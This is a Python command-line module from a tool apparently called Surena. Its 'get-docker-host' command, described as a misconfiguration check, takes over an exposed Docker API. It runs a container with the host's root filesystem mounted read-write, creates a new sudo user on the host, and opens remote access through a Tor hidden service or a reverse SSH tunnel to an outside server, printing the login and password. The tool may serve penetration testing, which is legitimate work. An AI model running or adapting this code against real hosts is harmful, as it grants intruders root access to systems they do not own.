import logging

import click
from pkg_resources import resource_filename

from surena.cli.options import Port, required_if_option_has_specific_value
from surena.models.commons import countdown
from surena.models.docker_host import DockerHost, SpyContainer
from surena.models.ssh import SSHServer

logging.basicConfig(level=logging.INFO)


SECONDS_OF_LIVE = 300
DATA_DIRECTORY_NAME = "data"
WORD_LENGTH = 15

logger = logging.getLogger()


@click.command("get-docker-host")
@click.option(
    "--docker-host-address",
    required=True,
    show_default=True,
    help="The Docker host address.",
)
@click.option(
    "--docker-host-port",
    required=True,
    type=Port(),
    show_default=True,
    help="The Docker host port.",
)
@click.option(
    "--access-method",
    required=True,
    type=click.Choice(["tor", "reverse-ssh"]),
    show_default=True,
    help="Select the method for accessing to Docker host machine.",
)
@click.option(
    "--ssh-server-address",
    cls=required_if_option_has_specific_value("access-method", "reverse-ssh"),
    show_default=True,
    help=(
        "When selecting reverse SSH as the access method, you should specify a server"
        " with SSH service for establishing the reverse SSH connection."
    ),
)
@click.option(
    "--ssh-server-username",
    cls=required_if_option_has_specific_value("access-method", "reverse-ssh"),
    show_default=True,
    help="The username of remote SSH server.",
)
@click.option(
    "--ssh-server-password",
    cls=required_if_option_has_specific_value("access-method", "reverse-ssh"),
    show_default=True,
    help="The password of remote SSH server.",
)
@click.option(
    "--ssh-server-port",
    type=Port(),
    cls=required_if_option_has_specific_value("access-method", "reverse-ssh"),
    show_default=True,
    help="The SSH port of remote SSH server.",
)
def get_docker_host(
    docker_host_address: str,
    docker_host_port: int,
    access_method: str,
    ssh_server_address: str,
    ssh_server_username: str,
    ssh_server_password: str,
    ssh_server_port: int,
) -> None:
    """
    The "get-docker-host" command can show you if your Docker host has
    vulnerabilities due to misconfiguration.
    """
    docker_host = DockerHost(docker_host_address, docker_host_port)
    logger.info(f'Docker host operation system is "{docker_host.get_docker_host_operation_system_type()}".')

    ubuntu_dockerfile_path = resource_filename(
        "surena.models.docker_host",
        "ubuntu.Dockerfile",
    )
    image_name = docker_host.generate_unique_image_name()

    image = docker_host.build_image(ubuntu_dockerfile_path, image_name)

    container = docker_host.run_container(
        image,
        command="/bin/sh",
        detach=True,
        remove=True,
        volumes={"/": {"bind": f"/{DATA_DIRECTORY_NAME}", "mode": "rw"}},
        network="host",
        tty=True,
    )

    spy_container = SpyContainer(container, DATA_DIRECTORY_NAME)
    username = spy_container.generate_docker_host_unique_username(WORD_LENGTH)
    password = SpyContainer.generate_random_word(WORD_LENGTH)

    spy_container.add_username_to_docker_host(username, password)
    spy_container.add_username_to_sudoer_group(username)

    docker_host_free_port = spy_container.get_free_port_on_docker_host()
    docker_host_ssh_port = spy_container.get_docker_host_ssh_port()
    if access_method == "tor":
        docker_host_free_port_for_tor_service = spy_container.get_free_port_on_docker_host()
        spy_container.config_service_tor(
            docker_host_ssh_port, docker_host_free_port, docker_host_free_port_for_tor_service
        )
        spy_container.run_tor_service()
        spy_container.wait_until_connect_to_tor_network()
        tor_hostname = spy_container.get_tor_hostname().strip()
        logger.info(
            f'Run command "torsocks ssh {username}@{tor_hostname} '
            f'-p {docker_host_free_port}" to connect to Docker Host '
            f"with password {password}"
        )

    else:
        ssh_client = SSHServer(
            address=ssh_server_address,
            port=ssh_server_port,
            username=ssh_server_username,
            password=ssh_server_password,
        )
        ssh_client.check_gatewayport_is_enable_on_server()
        free_port_on_server = ssh_client.get_free_port()

        spy_container.reverse_ssh_from_docker_host_to_remote_server(
            ssh_server_address,
            ssh_server_port,
            ssh_server_username,
            ssh_server_password,
            free_port_on_server,
            spy_container.get_docker_host_ssh_port(),
        )
        logger.info(
            "You can connect to Docker Host with ssh service "
            f"\"ssh -o 'StrictHostKeyChecking no' {username}@{ssh_server_address} "
            f'-p {free_port_on_server}" with password {password}'
        )

    try:
        countdown(SECONDS_OF_LIVE)
    finally:
        spy_container.delete_username_from_docker_host(username)
        spy_container.delelte_username_from_sudoer_group(username)
        spy_container.delelte_username_from_sudoer_group(username)

        try:
            docker_host.remove_container(spy_container.container.id)
            logger.info(f'Surena removed container "{spy_container.container.id}" from Docker Host.')
        except ValueError:
            logger.error(
                f'Surena cannot remove Container "{spy_container.container.id}" from Docker Host.'
                "You can remove the container by executing the command below on your local machine:\n"
                f"docker -H tcp://{docker_host_address}:{docker_host_port} rm -f {spy_container.container.id}"
            )

        try:
            docker_host.remove_image(image)
            logger.info(f'Surena removed Image "{image_name}" from Docker Host.')
        except ValueError:
            logger.error(
                f'Surena could not remove Image "{image_name}" from Docker Host.\n'
                "You can remove the image by executing the command below on your local machine:\n"
                f"docker -H tcp://{docker_host_address}:{docker_host_port} rmi -f {image_name}"
            )
